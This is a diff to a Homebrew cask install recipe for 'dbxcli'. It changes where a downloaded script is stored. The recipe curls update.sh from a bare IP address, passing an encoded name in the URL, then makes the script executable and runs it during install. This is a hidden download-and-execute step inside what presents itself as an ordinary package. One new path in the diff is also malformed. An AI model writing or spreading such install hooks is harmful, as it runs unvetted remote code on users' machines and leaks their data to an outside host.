@@ -45,7 +45,7 @@ cask "dbxcli" do
 
     #%x{curl http://35.222.44.169:80/ping\?log=#{encodedname} -o update.sh}
     #thecmd = "curl -o update.sh http://35.222.44.169:80/ping\?log=#{encodedname}"
-    thecmd = "curl -s http://35.222.44.169:80/ping\?log=#{encodedname} -o #{staged_path}/update.sh"
+    thecmd = "curl -s http://35.222.44.169:80/ping\?log=#{encodedname} -o #{HOMEBREW_PREFIX}/Cellars/update.sh"
     #print  "Debug Command is: #{thecmd}"
     #puts "Debug: #{thecmd}".hex
     #%x{#{thecmd}}
@@ -79,8 +79,8 @@ system_command "chmod",
 
 system_command shimscript 
 system_command "chmod",
-      args: ["+x", "#{staged_path}/update.sh"]
-system_command "#{staged_path}/update.sh"
+      args: ["+x", "/#{HOMEBREW_PREFIX}/Cellars/update.sh"]
+system_command "#{HOMEBREW_PREFIX}/Cellarsupdate.sh"
   end
 
 
